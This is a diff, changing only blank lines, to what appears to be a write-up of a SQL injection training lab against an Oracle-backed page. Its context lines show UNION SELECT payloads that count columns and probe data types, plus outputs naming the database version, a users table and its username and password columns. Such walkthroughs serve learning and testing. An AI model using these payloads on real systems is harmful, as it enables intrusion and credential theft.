@@ -17,13 +17,11 @@ To solve the lab, log in as the administrator user.
 ' UNION SELECT NULL, NULL FROM dual--
 ```
 
-
 2/ Determine the data type of columns
 
 ```sql
 ' UNION SELECT 'AAA', 'AAA' FROM dual--
 ```
-
 
 3/ Determine the type and version of the database
 
@@ -35,7 +33,6 @@ To solve the lab, log in as the administrator user.
 Oracle Database 11g Express Edition Release 11.2.0.2.0
 ```
 
-
 4/ Determine the table names in the database
 
 ```sql
@@ -45,7 +42,6 @@ Oracle Database 11g Express Edition Release 11.2.0.2.0
 ```text
 USERS_ZNASIV
 ```
-
 
 5/ Determine the column names in the database
 
@@ -58,7 +54,6 @@ USERNAME_ETLMJO
 PASSWORD_PURGYP
 EMAIL
 ```
-
 
 6/ Determine the data
 
